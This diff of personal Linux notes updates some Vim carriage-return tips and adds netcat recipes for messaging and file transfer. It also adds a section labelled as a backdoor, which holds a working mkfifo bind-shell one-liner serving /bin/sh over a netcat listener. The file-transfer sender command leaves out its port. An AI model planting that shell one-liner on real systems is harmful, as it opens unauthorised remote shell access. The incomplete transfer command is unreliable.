@@ -15,10 +15,23 @@ hello
 world
 ctrl-c
 The formatting will be off in the printer output
-You can embed carriage returns in a file as such
+You can embed carriage returns in a file as such if needed for whatever special reason
 in Vim
-Shift A - from command mode puts you in special insert mode
+Shift A - from command puts you into insert append
 ctrl-v - tells vim next key should be input literally
 enter
 File with embeded carriage return
 ____________________________________________________________________________
+NETCAT MESSENGER
+person recieving the message nc -l -p 4500     #and make sure the port is open on firewall!
+the sender nc 192.168.1.234 4500    # after you type and press enter message is sent
+_____________________________________________________________________________
+NETCAT FILE TRANSFER
+nc -l -p 3000 > receivingfile.txt
+cat sendingfile.txt | nc 192.168.1.234
+_______________________________________________________________________________
+NETCAT TELNET SERVER   BACKDOOR
+rm -f /tmp/f; mkfifo /tmp/f
+cat /tmp/f | /bin/sh -i 2>&1 | nc -l -p 3000 > /tmp/f   #bash has interesting differences
+client nc backdoorip 3000
+_________________________________________________________________________________
